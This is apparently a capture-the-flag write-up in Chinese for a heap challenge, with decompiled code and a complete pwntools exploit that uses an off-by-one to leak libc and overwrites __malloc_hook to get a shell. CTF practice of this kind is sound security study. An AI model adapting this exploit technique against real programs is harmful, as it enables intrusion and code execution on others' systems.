# BUU-vn2020-simpleheap

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

**add**

```c
int add()
{
  int result; // eax
  int v1; // [rsp+8h] [rbp-8h]
  int v2; // [rsp+Ch] [rbp-4h]

  v1 = sub_AB2();
  if ( v1 == -1 )
    return puts("Full");
  printf("size?");
  result = choice();
  v2 = result;
  if ( result > 0 && result <= 111 )
  {
    *((_QWORD *)&unk_2020A0 + v1) = malloc(result);
    if ( !*((_QWORD *)&unk_2020A0 + v1) )
    {
      puts("Something Wrong!");
      exit(-1);
    }
    dword_202060[v1] = v2;
    printf("content:");
    read(0, *((void **)&unk_2020A0 + v1), dword_202060[v1]);
    result = puts("Done!");
  }
  return result;
}
```

**edit**

```c
int edit()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = choice();
  if ( v1 < 0 || v1 > 9 || !qword_2020A0[v1] )
    exit(0);
  printf("content:");
  sub_C39(qword_2020A0[v1], dword_202060[v1]);
  return puts("Done!");
}
```

**show**

```c
int show()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = choice();
  if ( v1 < 0 || v1 > 9 || !qword_2020A0[v1] )
    exit(0);
  puts((const char *)qword_2020A0[v1]);
  return puts("Done!");
}
```

**dele**

```c
int dele()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = choice();
  if ( v1 < 0 || v1 > 9 || !qword_2020A0[v1] )
    exit(0);
  free((void *)qword_2020A0[v1]);
  qword_2020A0[v1] = 0LL;
  dword_202060[v1] = 0;
  return puts("Done!");
}
```

**输入函数**

```c
unsigned __int64 __fastcall sub_C39(__int64 a1, int a2)
{
  unsigned __int64 result; // rax
  unsigned int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( (int)i > a2 )
      break;
    if ( !read(0, (void *)((int)i + a1), 1uLL) )
      exit(0);
    if ( *(_BYTE *)((int)i + a1) == 10 )
    {
      result = (int)i + a1;
      *(_BYTE *)result = 0;
      return result;
    }
  }
  return result;
}
```

唯一的漏洞点就在这个输入函数中，它将跳出循环的条件放在了内部，导致了`off-by-one`，从而可以通过`ovlapping chunk`leak libc，之后再通过修改fd利用`house_of_spirit`，覆写`__malloc_hook`配合`__realloc_hook`实现`get shell`。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
#context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./vn_pwn_simpleHeap'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',29656)

elf = ELF(binary,checksec=False)
libc = ELF('./libc-2.23.so')

def add(size,content):
    sh.sendlineafter(': ','1')
    sh.sendlineafter('?',str(size))
    sh.sendafter(':',str(content))
    
def edit(idx,content):
    sh.sendlineafter(': ','2')
    sh.sendlineafter('?',str(idx))
    sh.sendafter(':',str(content))
    
def show(idx):
    sh.sendlineafter(': ','3')
    sh.sendlineafter('?',str(idx))
    
def dele(idx):
    sh.sendlineafter(': ','4')
    sh.sendlineafter('?',str(idx))

one = [0x45216,0x4526a,0xf02a4,0xf1147]
local = [0x45226,0x4527a,0xf0364,0xf1207]

add(0x18,'a'*0x18) #0
add(0x68,'b'*0x18) #1 0x70
add(0x68,'c'*0x18) #2 0x70
add(0x18,'d'*0x18) #3 0x20

edit(0,'\x00'*0x18+'\xe1') 
dele(1)
add(0x68,'a'*8) #1
show(2)

main_arena = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-88
libc_base=main_arena - 0x3C4B20
malloc_hook = libc_base + 0x3c4b10
fake_chunk = malloc_hook -0x23
realloc = libc_base+0x846C0
one_gadget = libc_base + one[1] 

leak('main_arena', main_arena)
leak('malloc_hook',malloc_hook)
leak('fake_chunk', fake_chunk)
leak('libc_base', libc_base)
leak('one gadget',one_gadget)

add(0x68,'\n') #4-->2
dele(2)
edit(4,p64(fake_chunk)+'\n')
add(0x68,'\n')
add(0x68,'\x00'*(0x13-8)+p64(one_gadget)+p64(realloc+0xd))

sh.sendlineafter(': ','1')
sh.sendlineafter('?','10')

sh.interactive()
```

较为常规的一道题目